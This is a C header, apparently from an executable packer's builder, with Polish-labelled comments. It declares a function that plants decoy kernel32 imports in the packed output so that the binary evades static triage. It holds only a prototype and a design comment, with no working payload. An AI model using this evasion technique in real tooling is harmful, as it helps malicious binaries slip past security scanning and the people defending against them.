#ifndef DECOY_IMPORTS_H
#define DECOY_IMPORTS_H

#include <Windows.h>

/*
 * ==========================================================================
 *  DECOY IMPORTS — synthetic benign import directory for the packed output
 *
 *  CZYM:  Appends a new .idata section holding a single import descriptor
 *         for kernel32.dll with 5-8 randomly picked innocuous exports
 *         (GetTickCount64, QueryPerformanceCounter, ...), plus matching
 *         INT/IAT thunk arrays.  Never called at runtime.
 *
 *  DLACZEGO: The CRT-free stub has an EMPTY import directory — a strong
 *         packer signal (every user-mode PE legitimately imports *something*).
 *         A small kernel32-only IAT is what a minimal MSVC GUI binary looks
 *         like, so the output stops standing out in static triage.
 *
 *  JAK:    Runs as Builder Phase 11.5 — after the LAST resource update cycle
 *         (Phases 10/10.5/11) and before signing (Phase 12).  UpdateResource
 *         relocates sections on .rsrc growth and fixes up only the RESOURCE
 *         and BASERELOC directories, so a decoy planted earlier would end up
 *         with a stale DataDirectory[IMPORT].  Grows the image buffer
 *         (HeapReAlloc), appends the section header and raw data, updates
 *         NumberOfSections / SizeOfImage / DataDirectory[IMPORT] / [IAT].
 *         IAT thunks initially mirror the INT (hint/name RVAs) — the loader
 *         overwrites them with resolved addresses at load time.  Refuses
 *         (returns FALSE) when a cert table is already present.
 * ==========================================================================
 */

#ifdef __cplusplus
extern "C" {
#endif

/* ppImage: in/out — PE image buffer, may be reallocated (HeapReAlloc).
 * pImageSize: in/out — buffer size in bytes, updated on growth.
 * Returns FALSE on malformed PE / no header room / allocation failure. */
BOOL DecoyImports_Apply(BYTE** ppImage, DWORD* pImageSize);

#ifdef __cplusplus
}
#endif

#endif /* DECOY_IMPORTS_H */
